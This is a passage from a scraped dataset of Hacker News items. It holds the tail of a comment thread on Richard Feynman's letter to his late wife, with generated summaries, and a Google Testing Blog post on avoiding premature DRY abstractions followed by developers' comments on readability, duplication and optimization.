confidence](https://pdfs.semanticscholar.org/c3ef/2811b280c069c6a99d66e4...) of age, is perhaps another selected pattern, with itâ€™s own subtle network rationale, but I digress.) > Instead, the mind of an organism dies, and leaves information scattered throughout the human network in the form of static reference â€” in the minds of family and peers, in blog posts and newspaper articles, in books and distorted recollections. > So how would one describe the pattern of death? Through an unsentimental network lens, we could perhaps think about it as a data compression or noise reduction tactic of the larger evolving system. Or at a more human scale, we could imagine it as a process by which organisms go from the role of __living dynamic actors__ to become __static references__. > While the Newton example is on a worldly stage, thereâ€™s perhaps another example thatâ€™s more on the personal level. You can imagine this same dynamic playing in the relations between parents and children. The death of a parent, tragic as it is, is an opportunity for this complex character to move from __actor__ to __reference__ in the minds of their children. This memory is now open to healthy reinterpretation, which perhaps gives their ideas and actions more meaning than when they were alive. A static reference of a human, whether itâ€™s a memory or a book or an article, becomes a bare skeleton picked clean, on which to hang new ideas and emotions and reflections. > After death, what remains is an abstraction â€” a simplification of the human who once was. But this abstraction can be re-imagined and built upon by the folks who follow. > And maybe this is healthy. Maybe this makes for healthy societies, with the right balance of new imaginings and old wisdoms on which to hang them. I have a hard time with death. I don't think of my mother as much as I'd like. But in the past few weeks, I've started writing to her in an empty group chat that goes to no one. I've been going through old emails and replying to all the messages I never responded to, which have previously been the source of a lot of shame. And it's really helping me. It's like she's continuing to grow with me, and me with her. And not just that, but it's helping me override the version of her (the broken versions, the sick versions) that overrepresent my recollections of her in the months before her death. In writing and communing with her, even in her absence, my relationship with her in growing, and she is growing too. And she's more alive in my conversations with my living family. And I'm reflecting my daily interactions and decisions through her consideration. It's very strange. I feel like I've been reintroduced to my mother. And it's also leading me to odd thoughts. Is every departure or absence of the true and active physical form (not just in death) a chance to consider someone like this. Can I share secret thoughts with a new love, with an imagined version of them, since the flesh-and-blood version of them would be scared of my sharing such things with them? Can I treat the living as dead in some ways, to shape them in my mind just as much as I might shape them later in the real world? Is this what we're always doing implicitly, when we build models of one another an empathize and imagine what they might do, in the spaces between when we have access to them? And what might we be losing in the world when we never have these absences, when we are never disconnected, never far enough away to grow alongside the imagined version of our loved ones, rather than trying to grow only with the actual biological one? Anyhow, thanks for hearing me out on these thoughts. I will imagine a reader as entertained and grateful, until you choose to reveal yourself otherwise <3 [1]: https://medium.com/@patcon/reflections-on-the-evolved-patter... reply hsuduebc2 5 hours agoprevThat's hard. reply sophoskiaskile 8 hours agoprev [â€“] It's beautiful :)) reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Richard Feynman, a celebrated physicist, wrote a heartfelt love letter to his late wife, Arline, 16 months after her death in 1945.",
      "The letter, which remained unopened until after Feynman's death in 1988, expresses his enduring love and sorrow.",
      "This poignant letter is featured in the book \"Letters of Note.\""
    ],
    "commentSummary": [
      "A forum user shares a decade-long journey of coping with their wife's death, reflecting on Richard Feynman's promiscuity as a coping mechanism and the balance between career and family.",
      "The discussion delves into the emotional and moral complexities of seeking new relationships after a spouse's death, emphasizing informed consent and the irreplaceability of deep, long-term connections.",
      "A Hacker News post revisits Feynman's letter to his late wife, sparking debates on love, loss, the ethics of publishing private writings, and broader themes of death's role in societal evolution and personal growth."
    ],
    "points": 282,
    "commentCount": 75,
    "retryCount": 0,
    "time": 1717063567
  },
  {
    "id": 40525064,
    "title": "Avoid Premature Abstractions: Rethinking the DRY Principle in Coding",
    "originLink": "https://testing.googleblog.com/2024/05/dont-dry-your-code-prematurely.html",
    "originBody": "Testing Blog Don't DRY Your Code Prematurely Tuesday, May 28, 2024 This is another post in our Code Health series. A version of this post originally appeared in Google bathrooms worldwide as a Google Testing on the Toilet episode. You can download a printer-friendly version to display in your office. By Dan Maksimovich Many of us have been told the virtues of â€œDonâ€™t Repeat Yourselfâ€ or DRY. Pause and consider: Is the duplication truly redundant or will the functionality need to evolve independently over time? Applying DRY principles too rigidly leads to premature abstractions that make future changes more complex than necessary. Consider carefully if code is truly redundant or just superficially similar. While functions or classes may look the same, they may also serve different contexts and business requirements that evolve differently over time. Think about how the functionsâ€™ purpose holds with time, not just about making the code shorter. When designing abstractions, do not prematurely couple behaviors that may evolve separately in the longer term. When does introducing an abstraction harm our code? Letâ€™s consider the following code: # Premature DRY abstraction assuming # uniform rules, limiting entity- # specific changes. class DeadlineSetter: def __init__(self, entity_type): self.entity_type = entity_type def set_deadline(self, deadline): if deadline <= datetime.now(): raise ValueError( â€œDate must be in the futureâ€) task = DeadlineSetter(â€œtaskâ€) task.set_deadline( datetime(2024, 3, 12)) payment = DeadlineSetter(â€œpaymentâ€) payment.set_deadline( datetime(2024, 3, 18)) # Repetitive but allows for clear, # entity-specific logic and future # changes. def set_task_deadline(task_deadline): if task_deadline <= datetime.now(): raise ValueError( â€œDate must be in the futureâ€) def set_payment_deadline( payment_deadline): if payment_deadline <= datetime.now(): raise ValueError( â€œDate must be in the futureâ€) set_task_deadline( datetime(2024, 3, 12)) set_payment_deadline( datetime(2024, 3, 18)) The approach on the right seems to violate the DRY principle since the ValueError checks are coincidentally the same. However, tasks and payments represent distinct concepts with potentially diverging logic. If payment date later required a new validation, you could easily add it to the right-hand code; adding it to the left-hand code is much more invasive. When in doubt, keep behaviors separate until enough common patterns emerge over time that justify the coupling. On a small scale, managing duplication can be simpler than resolving a premature abstractionâ€™s complexity. In early stages of development, tolerate a little duplication and wait to abstract. Future requirements are often unpredictable. Think about the â€œYou Arenâ€™t Gonna Need Itâ€ or YAGNI principle. Either the duplication will prove to be a nonissue, or with time, it will clearly indicate the need for a well-considered abstraction. Labels: Code Health , Dan Maksimovich , TotT î¢Š î—„ î—ˆ Labels î—… î‹‡ Archive î—… Feed Follow @googletesting Google Privacy Terms",
    "commentLink": "https://news.ycombinator.com/item?id=40525064",
    "commentBody": "Don't DRY Your Code Prematurely (googleblog.com)231 points by thunderbong 3 hours agohidepastfavorite153 comments hardwaregeek 2 hours agoIt's important to remember that all best practices are not created equal. I'd prioritize readability over DRY. I'd prioritize cohesion over extensibility. When people talk about best practices, they don't talk about how a lot of them are incompatible, or at least at odds with each other. Writing code is about choosing the best practices you want to prioritize as much as it's about avoiding bad practices. reply jay-barronville 41 minutes agoparentReadability is almost always (almost only because there are some rare exceptions) the most important thing to me, even for low-level systems software. I always ask myself, â€œIf I donâ€™t touch this code for a year and then come back to it, how long will it take me to understand it again? How long will it take someone whoâ€™s never been exposed to this code to understand it?â€ Luckily, our compilers and interpreters have gotten so good and advanced that, in 95%+ of cases, we need not make premature â€œoptimizationsâ€ (or introduce hierarchies of â€œdesign patternsâ€) that sacrifice readability for speed or code size. reply arp242 17 minutes agorootparentWas reading 1978 Elements of Programming Style a while ago. It's mostly Fortran and PL/I. Some of it is outdated, but a lot applies today as well. See e.g. https://en.wikipedia.org/wiki/The_Elements_of_Programming_St... They actually have a Fortran example of \"optimized\" code that's quite difficult to follow, but allegedly faster according to the comments. But they rewrote it to be more readable and ... turns out that's actually faster! So this already applied even on 197something hardware. Also reminds me about this quote about early development of Unix and C: \"Dennis Ritchie encouraged modularity by telling all and sundry that function calls were really, really cheap in C. Everybody started writing small functions and modularizing. Years later we found out that function calls were still expensive on the PDP-11, and VAX code was often spending 50% of its time in the CALLS instruction. Dennis had lied to us! But it was too late; we were all hooked...\" And Knuth's \"premature optimisation is the root of all evil\" quote is also decades old by now. Kind of interesting we've been fighting this battle for over 50 years now :-/ (It should go without saying there are exceptions, and cases where you do need to optimize the shit out of things, after having proven that performance may be an issue. Also at scale \"5% faster\" can mean \"need 5% less servers\", which can translate to millions/dollars saved per year â€“ \"programmers are more expensive than computers\" is another maxim that doesn't always hold true). reply delichon 1 hour agoparentprev\"Read\" isn't quite the right word for code. \"Decode\" is better. We have to read to decode, but decoding is far less linear than reading narrative text. Being DRY usually makes decoding easier, not harder, because it makes the logic more cohesive. If I know you only fromajulate blivers in one place I don't have to decode elsewhere. reply wwfn 52 minutes agorootparentI was just mulling this over today. DRY = easier-to-decode is probably true if you're working on groking the system at large. If you just want to peak in at something specific quickly, DRY code can be painful. I wanted to see what compile flags were used by guix when compiling emacs. `guix edit emacs-next` brings up a file with nested definitions on top of the base package. I had to trust my working memory to unnest the definitions and track which compile flags are being added or removed. https://git.savannah.gnu.org/cgit/guix.git/tree/gnu/packages... It'd be more error prone to have each package using redundant base information, but I would have decoded what I was after a lot faster. Separately, there was a bug in some software aggregating cifti file values into tab separated values. But because any cifti->tsv conversion was generalized, it was too opaque for me to identify and patch myself as a drive-by contributor. https://github.com/PennLINC/xcp_d/issues/1170 to https://github.com/PennLINC/xcp_d/pull/1175/files#diff-76920... reply emidln 24 minutes agorootparentBazel solves this exact problem (coming from its macrosystem) by allowing you to ask for what I term the \"macroexpanded\" BUILD definition using `bazel query --output=build //some/pkg/or:target`. When bazel does this, it also comments the file, macro,and line number the expanded content came from for each block. This gives us reuse without obscuring the real definition. I automated this in my emacs to be able to \"macroexpand\" the current buid file in a new buffer. It saves me a lot of time. reply withinboredom 41 minutes agorootparentprev> Being DRY usually makes decoding easier, not harder \"Usually\" being the keyword and what the article is all about IMHO. I work in a codebase so DRY that it takes digging through dozens of files to figure out what one constant string will be composed as. It would have been simpler to simply write it out, ain't nobody going to figure out OCM_CON_PACK + OCM_WK_MAN means at a glance. reply djeastm 29 minutes agorootparent>I work in a codebase so DRY that it takes digging through dozens of files to figure out what one constant string will be composed as. I don't know the codebase, but to my mind that level of abstraction means it's a system-critical string that justifies the work it takes to find. reply hathawsh 1 hour agorootparentprevWell, \"read\" is still the verb we use most often to describe a human interpreting code. Also, many information-dense books are not intended to be read linearly, yet we still say we're \"reading\" (or \"studying\") the book. reply zooq_ai 0 minutes agoparentprevaka \"Engineering is about trade-offs\" reply drojas 1 hour agoparentprevI agree and would add that one of the goals for technical design or architecture work is to choose the architecture that minimizes the friction between best practices. For example if you architecture makes cohesion decrease readability too much then perhaps there is a better architecture. I see this tradeoff pop up from time to time at my work for example when we deal with features that support multiple \"flavors\" of the same data model, then we have either a bunch of functions for each providing extensibility or a messy root function that provides cohesion. At the end both best practices can be supported by using an interface (or similar construct depending on the language) in which cohesion is provided by logic that only cares about the interface and extensibility is provided by having the right interface (offload details to the specific implementations) reply englishspot 1 hour agoparentprevI have a pessimistic view that ultimately the only best practices that matter are the ones your boss or your tech lead likes. reply jkaptur 1 hour agorootparentWhat about when you are the boss or tech lead? reply znkr 1 hour agorootparentThen the only best practices that matter are the ones that your team believes are correct reply rvnx 36 minutes agorootparentThe best practices are the ones that allow you to do business and where the maintenance work is relatively not too painful considering the budgeted development time. Your task is to deliver a good product, not necessarily good code. reply blackoil 59 minutes agoparentprevI am of opinion, code should be written to be readable. Rest of the desirable properties are just side-effects. reply jay-barronville 34 minutes agorootparentFully agree. I think this is something that takes some time/experience to appreciate though. Junior engineers will spend countless hours writing pages of code that align with the â€œdesign patternsâ€ or â€œbest practicesâ€ of the day when thereâ€™s a simpler implementation of the code theyâ€™re writing. (Iâ€™m not saying this condescendinglyâ€”I was once a junior engineer who did that too!) reply marcosdumay 32 minutes agorootparentprevMost commonly, code should optimized into being easy to change. That's almost entirely coincidental with being easy to read. But even easiness to read is a side effect. reply gavmor 39 minutes agorootparentprevI think it's fair to say that between behavior and maintainability, one is inflexible and the other hangs from it in tension. reply unnouinceput 1 hour agoparentprevMaintenance is 90% of a project life time. Sometime those \"best practices\" rigid implemented means the project won't live to see even it's 1st birthday. reply 0xbadcafebee 1 hour agoparentprevReadability doesn't matter much when you have 10,000+ lines of code. You aren't going to read all that code, and new code introduced by other people continuously isn't something you can keep track of, so even if you understand one tiny bit of code, you won't know about the rest. You need a system of code management (documentation, diagram, IDE, tests, etc), to explain in a human-friendly way what the hell is going on. Small chunks of code will be readable enough, and the code management systems will help you understand how it relates to other code. reply chipdart 1 hour agorootparent> Readability doesn't matter much when you have 10,000+ lines of code. You aren't going to read all that code (...) You got it entirely backwards. Readability becomes far more important with the size of your project. When you get a bug report of a feature request, you need to dive into the code and update the relevant bits. With big projects, odds are you will need to change bits of the code you never knew they existed. The only way that's possible is if the code is clear and it's easy to sift through, understand, and follow. > You need a system of code management (documentation, diagram, IDE, tests, etc), to explain in a human-friendly way what the hell is going on. That system of code management is the code itself. Any IDE supports searching for references, jump to definitions, see inheritance chains, etc. Readable code is code that is easy to navigate and whose changes are obvious. reply foresto 1 hour agorootparentprev> Readability doesn't matter much when you have 10,000+ lines of code. You aren't going to read all that code, As someone who has read 10,000+ lines in order to track down surprising behavior in other people's code, I can say without a doubt that readability still matters at that scale. Code management systems can sometimes be helpful, but they are no substitute. reply dieortin 1 hour agorootparentprevEven if youâ€™re not going to read 10.000+ lines, if the few you read are easy to understand youâ€™re still going to have a much better time maintaining the codebase. reply fmbb 1 hour agorootparentprev> Small chunks of code will be readable enough Ravioli code is a real problem though. Saying small chunks are readable is not enough. The blast radius of a five byte change can be fifteen code paths and five million requests per hour. reply ugh123 1 hour agorootparentprev> You need a system of code management (documentation, diagram, IDE, tests, etc), to explain in a human-friendly way what the hell is going on I think this is where AI could be helpful in explaining and inspecting large codebases, as an assist to a developer. reply haswell 2 hours agoprevOne of the #1 issues Iâ€™ve seen with DRY over the years seems to stem from a misunderstanding of what it means. DRY is not just about code duplication, itâ€™s about information/knowledge duplication, and code happens to be one representation of information. Hyper focusing on code duplication quickly gets into premature optimization territory, and can result in DRYing things that donâ€™t make sense. Focusing on information duplication leaves some leeway for the code and helps identify which parts of the code actually need DRY. The difference is important, and later editions of the Pragmatic Programmer call this out specifically. But the concept of DRY often gets a bit twisted in my experience. reply tetha 1 hour agoparentThis is why some advice from Sandy Metz really stuck with me. It is not a problem to /have/ the same code 2, 3 or even 4 times in a code base. In fact, sometimes just straight up copy-paste driven development can be a valid development technique. Initially that statement horrified me, but by now I understand that just straight up copy-pasting some existing code can be one of these techniques that require some discipline to not overdo, but it's legit. And in quite a few cases, these same pieces of code just start developing in different directions and then they aren't the same code anymore. However, if you have to /change/ the same code in the same way in multiple places, then you have a problem. If you have to fix the same bug in multiple places in similar or same ways, or have to introduce a feature in multiple places in similar way - then you have a problem. Once that happens, you should try to extract the common thing into a central thing and fix that central thing once. It feels weird to work like that at first, but I've found that often it results in simpler code and pretty effective abstractions, because it reacts to the actual change a code base experiences. reply nostrademons 1 hour agorootparentThe challenge is that if you're not careful, you can end up copy-pasting the same bit of code hundreds of time before realizing it has to be changed. I once worked in a year-old startup of ~5 developers that found it had written the same line of code (not even copy-pasted, it was only one line of code so the devs had just written it out) 110 times. A bug was then discovered in that line of code, and it had to be fixed in 110 places, with no guarantee that we'd even found all of them. This was a very non-obvious instance of DRY, too, because it was only one line of code and the devs believed it was so simple that it couldn't possibly be wrong. But that's why you sometimes need to be aware of what you're writing even on the token level. That's why we have principles like \"3 strikes and then you refactor\". 3 times fixing a bug isn't too onerous; even 4-6 is pretty manageable. Once you get to 20+, there starts to be a strong disincentive to fixing the bug, and even if you want to, you aren't sure you got every instance. reply sodapopcan 2 minutes agorootparentMetz says she adds TODOs and comments that it has been duped. It's one of those things that requires thought, and she even says it's an advanced technique. How many times is too many? I'm not sure, but I can safely say over 100 is WAY too many. Probably 10 is too many. Heck, if you find yourself updating the same code in four different places over and over and over, it's time to abstract. The idea is to let the code sit and let the abstraction reveal itself if there isn't already an OBVIOUS one. As mentioned by the parent poster, you're looking out for these copies to diverge. If four or five copied codepaths haven't diverged after some time, there's a good chance that just from working on it every day you will have realized the proper way to abstract it. You absolutely do have to be careful. But even so, it's arguable that having to update something in 100 different places is better than updating in one place and having it affect 100 different paths where you only want 99 of them (this is some hyperbole, of course). reply spion 39 minutes agorootparentprevThis really makes me think we should be focusing on cost/benefit, risk/reward, pros/cons at all times. If we have a bug in these 5 copies, will it be too hard to fix in all of them? No? What about these 10 copies? If that sounds like its starting to get difficult, maybe now is the time. reply danielmarkbruce 25 minutes agorootparentThat means you have to think. Most people hate thinking. Seriously. reply tetha 39 minutes agorootparentprevOh yeah we've had those as well. I kinda feel two things about these at the same time. At a practical level, these situations sucked. Someone had to search for the common expression, look at each instance, decide to change it to the central place or not. They spent 2-3 days on that. And then you realize that some people were smart and employed DRY - if they needed that one expression 2-3 times, they'd extracted one sub-expression into a variable and suddenly there was no pattern to find those anymore. Those were 2-4 fun weeks for the whole team. But at the same time, I think people learned an important concept there: To see if you are writing the same code, or if you're referring to the same concept and need the same source of truth, like the GP comment says. I'm pretty happy with that development. Which is also why my described way is just one tool in the toolbox. Like, one of our code bases is an orchestration system and it defines the name of oidc-clients used in the infrastructure. These need to be the same across the endpoints for the authentication provider, as well as the endpoints consumed by the clients of the oidc provider - the oauth flows won't work otherwise. And suddenly it clicked for a bunch of the dudes on the team why we should put the pedestrian act of jamming some strings together to get that client-id into some function. That way, we can refer to the concept or naming pattern and ensure the client will be identical across all necessary endpoints, over hoping that a million different string joins all over the place result in the same string. In such a case, early or eager DRY is the correct choice, because this needs to be defined once and exactly once. reply withinboredom 31 minutes agorootparentprevThis is why you shouldn't write one line of code, ever again. /s We've all been there though, at some point in our careers. Possibly multiples of times (try changing thousands of \"echo\" statements to call a logger because it was initially meant to be a simple script that just kept growing). It sucks but I've also been on the other side, where it was DRY but 20% of the calls to the function now needed different behavior. Finding all of those usages was just as hard. reply wging 13 minutes agorootparentprevYou're thinking of Sandi Metz: https://sandimetz.com/blog/2016/1/20/the-wrong-abstraction reply gmueckl 37 minutes agorootparentprevConversely, trying too hard to DRY when requirements at call sites start to diverge can lead to an unnecessary complex single implementation of something where there could be two very similar but still straightforward pieces of code. reply bojanz 1 hour agoparentprevCouldn't agree more. There's a great decade-old blog post by Mathias Verraes which illustrates this well, I keep coming back to it: https://verraes.net/2014/08/dry-is-about-knowledge/ reply HanClinto 1 hour agoparentprevI feel like I hear de-duplication of information / knowledge often referred to as \"Single Source of Truth\" reply derefr 1 hour agorootparentI think the best way to understand DRY is by thinking about the practical problem it solves: you don't want footguns in the codebase where you could change something in one place, but forget to change the same thing in other places (or forget to change the complementary logic/data in other components.) The goal of DRY as a refactoring, is first-and-foremost to obviate such developer errors. And therefore â€” if you want to be conservative about applying this \"best practice\" â€” then you could do that by just never thinking \"DRY\" until a developer does in fact trip over some particular duplication in your codebase and causes a problem. reply schneems 1 hour agoparentprevSomeone â€œyes andâ€-ed a comment of mine awhile ago to teach me DRY SPOT. Donâ€™t repeat yourself - Single Point of Truth. I.e. what you said. Couple logic that needs to be coupled. Decouple logic that shouldnâ€™t be coupled. reply joe_fishfish 1 hour agoparentprevThis is a more insightful comment than the comment at the top, and also more useful than the blog post. reply epr 53 minutes agoprevThe example is hilariously terrible. Firstly, this is the currently required code: def set_deadline(deadline): if deadlineIn WET code (write everything twice) everything looks primitive, as if it was written by complete newbie, and every change needs to be added at multiple places, but each change is trivial and time to finish is predictable. I would go as far as calling the code boring. The most difficult thing is to resist the temptation to remove the duplicity. This only scales so far. After some point, it's very easy to run into cases where you meant to change something everywhere but forgot/didn't know about others. Not to say everything should be so compartmentalized as to restrict change, but there is a balance to be had. reply gary_0 59 minutes agorootparentWhich is why you need a balance between WET and DRY. DAMP = Don't Alter in Many Places. reply kag0 8 minutes agorootparentI've never heard this one before, but I love it. Unfortunately we've also got \"Don't Abstract Methods Prematurely\" and \"Descriptive And Meaningful Phrases\". reply thfuran 1 hour agorootparentprevYes, what actually happens is that many code changes are released half-baked because logic only got updated in 1 (or 13) of the 14 places that needed to be updated, and the cussing and hair pulling just starts later. reply softwaredoug 2 hours agoprevGenerality can really hurt performance. Duplicating specialized code to handle different cases can really help optimize specific code hot spots for certain data patterns or use cases. So DRY isnâ€™t an obvious default for me. reply mikepurvis 2 hours agoparentI think it really depends and it's a case where a lot of engineering judgment and taste comes to bear. For example right now I'm maintaining a Jenkins system that has two large and complicated pipelines that are about 90% overlapping but for wretched historical reasons were implemented separately and the implementations have diverged over the years in subtle ways that now make it challenging to re-unify them. There is no question in my mind that this should always have been built as either a single pipeline with some parameters to cover the two use-cases, or perhaps as a toolbox of reusable components that are then used for the overlapping area. But I expect the mentality at the time the second one was being stood up was that it would be less disruptive to just build the new stuff as a parallel implementation and figure out later how to avoid the duplication. reply kccqzy 2 hours agorootparentYou are describing technical debt, not conscious decisions to be DRY or not DRY. reply mikepurvis 1 hour agorootparentHmm. Certainly there's no doubt that there's technical debt (\"do it this way for now, we'll clean it up later\") here too, but I think there was also a conscious decision to build something parallel rather than generalizing the thing that already existed to accommodate expanding requirements. reply marcandre 2 hours agoparentprevI'd love examples where DRY can really hurt performance. Typically what matters most in terms of performance is the algorithm used, and that won't change. More importantly, cleverer people than me said \"premature optimization is the root of all evil\" reply nsguy 2 hours agorootparentThis quote is often taken out of context, here's the full quote: \"Programmers waste enormous amounts of time thinking about, or worrying about, the speed of noncritical parts of their programs, and these attempts at efficiency actually have a strong negative impact when debugging and maintenance are considered. We should forget about small efficiencies, say about 97% of the time: premature optimization is the root of all evil. Yet we should not pass up our opportunities in that critical 3%.\" If you want a specific example look at something that needs to be performant, i.e. in those 3%, let's say OpenSSL's AES implementation for x86, or some optimized LLM code, you'll see the critical performance sections include things that could be reused, but they're not. Also the point Knuth is making is don't waste time on things that don't matter. Overuse of DRY falls squarely into that camp as well. It takes more work and doesn't really help. I like Go's proverb there of \"A little copying is better than a little dependency.\" reply rgrmrts 1 hour agorootparentKnuth was talking about a very specific thing, and the generalization of that quote is a misunderstanding of his point. Source: Donald Knuth on the Lex Fridman podcast, when Lex asks him about that phrase reply nsguy 1 hour agorootparentI wasn't aware this was discussed, thanks for the pointer! I'm curious now what he says he was talking about ;) reply mikepurvis 2 hours agorootparentprevIMO it hurts developer productivity more than performance, because it introduces indirection and potentially unhelpful abstractions that can obscure what is actually going on and make it harder to understand the code. In raw performance this could manifest as issues with data duplication bloating structures and resulting in cache misses, generic structures expressed in JSON being slower then a purpose-built struct, chasing pointers because of functions buried in polymorphic hierarchies. But I doubt that any of this would really matter in 99% of applications. reply rhdunn 2 hours agorootparentprevPremature optimization is about not making a micro-implementation change (e.g. `++i` vs `i++`) for the sake of percieved performance. You should always measure to identify slow points in expected workloads, profile to identify the actual slow areas, make high-level changes (data structure, algorithm) first, then make more targetted optimizations if needed. In some cases it makes sense, like writing SIMD/etc. specific assembly for compression/decompression or video/audio codecs, but more often than not the readable version is just as good -- especially when compilers can do the optimizations for you. A lot of times I've found performance increases have come from not duplicating work -- e.g. not fetching the same data each time within a loop if it is fixed. reply nsguy 2 hours agorootparentNot really. Knuth was talking about putting effort to make a non-critical portion of the software more optimized. He's saying put effort into the smaller parts where performance is critical and don't worry about the rest. It's not about `++i` vs. `i++` (which is semantically different but otherwise in modern compilers not an optimization anyways but I digress). reply rhdunn 1 hour agorootparentThat was my point, though. Don't worry about minor possible changes to the code where the performance doesn't matter. For example, if the ++i/i++ is only ever executed at most 10 times in a loop, is on an integer (where the compiler can elide the semantic difference) and the body of the loop is 100x slower than that. If you measure the code's performance and see the ++i/i++ is consuming a lot of the CPU time then by all means change it, but 99% of the time don't worry about it. Even better, create a benchmark to test the code performance and choose the best variant. reply nsguy 1 hour agorootparentThat's not my interpretation. If you're profiling and benchmarking you're already engaging in (premature) optimization. This process you're describing of finding out whether `i++` is taking a lot of CPU time and then changing it is exactly what Knuth is saying not to worry about for 97% of your code. Knuth is saying it doesn't matter if `i++` is slow if it's in a non-performance critical part of your code. Any large piece of software has many parts where it doesn't matter for any practical purpose how fast they run and certainly one loop in that piece of software doesn't matter. For example, the software I'm working on these days has some fast C code and then a pile of slow Python code. In your analogy all the Python code is known to be much slower than the C code, we don't need a profiler or benchmarks to tell that, but it also doesn't matter because the core performant functionality is in that C code. reply randomdata 1 hour agorootparentKnuth says forget about small efficiencies in 97% of your code. Indeed, the `i++` optimization isn't apt to make more than a small difference, even with the most naive compiler, but other decisions could lead to larger chasms. It seems he is still in favour of optimizing for the big wins across the entire codebase, even if it doesn't really matter in practice. But it's your life to live. Who cares what someone else thinks? reply ummonk 1 hour agorootparentprevThe optimizations he was talking about were things like writing in assembly or hand-unrolling loops. It was assumed that youâ€™ve already picked an performant algorithm / architecture and are writing in a performant low level language like C. Also, your digression about modern compilers is irrelevant to the context of the quote, since Knuth talked about premature optimization at a time when compilers were much simpler than today. reply swatcoder 2 hours agorootparentprevIn the general case, it usually depends on the latency of what you'd DRY your code to vs the latency of keeping the implementation local and specialized. If you're talking about consolidating some code from one in-process place to another in the same language, you're mostly right: there's only going to be an optimization/performance concern when you have a very specific hotspot -- at which point you can selectively break the rule, following the guidance you quoted. This need for rule-breaking can turn out to be common in high-performance projects like audio, graphics, etc but is probably not what the GP had in mind. In many environments, though, DRY'ing can mean moving some implementation to some out-of-language/runtime, out-of-process. or even out-of-instance service. For many workloads, the overhead of making a bridged, IPC, or network call swamps your algorithm choice and this is often apparent immediately during design/development time. It's not premature optimization to say \"we'll do a lot better to process these records locally using this contextually tuned approach than we will calling that service way out over there, even if the service can handle large/different loads more efficiently\". It's just common sense. This happens a lot in some teams/organizations/projects. reply xiasongh 1 hour agorootparentprevThis might not be a perfect example, but there's a paper by Michael Stonebraker \"One size fits all\": an idea whose time has come and gone It might not specifically be DRY, but still related generic vs specialized code/systems. https://ieeexplore.ieee.org/document/1410100 reply eyelidlessness 2 hours agorootparentprev> I'd love examples where DRY can really hurt performance. A really common example is overhead of polymorphism, although that overhead can vary a lot between stacks. Another is just the effect caused by the common complaint about premature abstraction: proliferation of options/special cases, which add overhead to every case even when they donâ€™t apply. reply laborcontract 2 hours agorootparentprevLangchain. Helps on the initial productivity, is a nightmare on the debugging and performance improvement end. reply candiddevmike 2 hours agorootparentprevIn an effort to DRY, you add a bunch of if statements to handle every use case. reply jprete 1 hour agoparentprevI agree for very specific situations, but compilers tend to get better at optimization over time, and it can be better to express plain intent in the code and leave low-level optimization to the compiler, rather than optimizing in code and leaving future hardware/compiler improvements on the table. reply sys_64738 1 hour agoparentprev> Generality can really hurt performance. Only in critical regions of code though. reply 0xbadcafebee 1 hour agoprevLike the article ends with, DRY goes hand in hand with YAGNI. The point isn't to build a million abstractions; it's to find the places where you have duplication and de-duplicate it, or where you know there'll be duplication and abstract it, or to simply rearchitect/redesign to avoid complexity and duplication. This applies to code, data models, interfaces, etc. The duplication is typically bad because it leads to inconsistency which leads to bugs. If your code is highly cohesive and loosely coupled, this is less likely [across independent components]. And on this: > When designing abstractions, do not prematurely couple behaviors Don't ever couple behaviors, unless it's within the same component. Keep your code highly cohesive and loosely coupled. Once it's complete, wall it off from the other components with a loosely-coupled interface. Even if that means repeating yourself. But don't let anyone make the mistake of thinking they both work the same because they have similar-looking interfaces or behaviors, or you will be stuck again in the morass of low cohesion. This is probably one of the 3 biggest problems in software design. Libraries are a great help here, but libraries must be both backwards compatible, and not tightly coupled. Lack of backwards compatibility is probably the 4th biggest problem... reply ofrzeta 8 minutes agoprevI know it's supposed to be catchy but \"Don't Repeat Yourself\" is quite too dogmatic. A little redundancy can absolutely help readablity. Obviously you don't want to repeat complicated code blocks that you have to maintain twice. reply srvaroa 13 minutes agoprevâ€œAnytime you apply a rule too universally, it turns into an anti-patternâ€œ. Quote from Will Larson found in another HN post (https://review.firstround.com/unexpected-anti-patterns-for-e...) right after checking out this one. reply renegade-otter 2 hours agoprevI think the only hard and fast rule is to DRY the code that will introduce a bug if you change it in one place and not the other. And if it will, at least do a fat comment in both places for posterity. Whenever I have to have a \"mental model\" of the code, I know I screwed up. reply senkora 2 hours agoparent+1. If I go with the comment option, then I'll sometimes write a comment like \"If you change this here, then you must change it everywhere with this tag: UNIQUE-TAG\". This way, the reader can just do a global grep to find all the places to change, and you don't have to list them in each place and keep them in sync. reply randomdata 46 minutes agoparentprevA comment is a nice addition, but the very least is to ensure that your test suite properly covers cases where changing one and not the other will introduce a problem. This not only ensures that both are changed, but that both are changed in the way they need to be. A comment alone may prompt you to change both (if you ever read it - I bet a lot of developers don't), but you may not notice when you fail to change them in the same way, which is no better than not changing one. reply watters 1 hour agoprevThis reads like a paraphrase of this widely circulated post from 8 years agoâ€¦ https://sandimetz.com/blog/2016/1/20/the-wrong-abstraction reply liampulles 21 minutes agoprevMy maxim: is \"it\" intrinsically the same, or coincidentally the same? Intrinsically the same means a rule, and so there should be 1 source of truth for it. Coincidentally the same means it has the same shape but this just happens to be the case, and they should be left separate to evolve independently. Ultimately, it boils down to really thinking about the domain. reply rmnclmnt 2 hours agoprevIt is especially hurtful when people apply DRY immediately on some spaghetti code already mixing abstractions. Then you find yourself untangling intertwined fatorized code on top of leaky abstractions, losing hours/days and pulling your hair outâ€¦ (Iâ€™m bald already but Iâ€™m pretty sure Iâ€™m still losing hair in these situations) reply PaulHoule 2 hours agoprevNot a conclusive example. In the industry code that isn't DRY is a much bigger problem than code that is too DRY. reply swatcoder 2 hours agoparentHaving specialized in project rescue, touring all over \"the industry\", you can't possibly make that generalization. For every purported best practice, there are teams/orgs that painted themselves into a corner by getting carried away and others that really would have benefited from applying it more than they did. In the case of DRY, it's an especially accessible best practice for inexperienced developers and the project leads many of them become. Many many teams do get carried away, mistaking \"these two blocks of code have the same characters in the same sequence\" with \"these two delicate blocks of code are doing the same thing and will likely continue to do so\" Having advice articles floating around on both sides of practices like this helps developers and teams find the guidance that will get them from where they are to where they need to be. Context, nuance, etc, etc reply PaulHoule 2 hours agorootparentIf that's what they wanted to prove they should have shown a better example. reply swatcoder 2 hours agorootparentThat's fair. I think the insight/concept behind the essay is sound, but I agree that the example (and writing) could be a lot better. reply AnimalMuppet 1 hour agorootparentprevIn Zion National Park, there's a hike called Angel's Landing. For part of the hike, you go along this ridge, where on one side you have a cliff of 500 feet straight down, and on the other side, you have a cliff of 1000 feet straight down. And in places, the ridge is only a couple of feet wide. Best practices can be like that. \"Here's something to avoid!\" \"OK, I'll back far away from that.\" Yeah, but there's another cliff behind you, of the 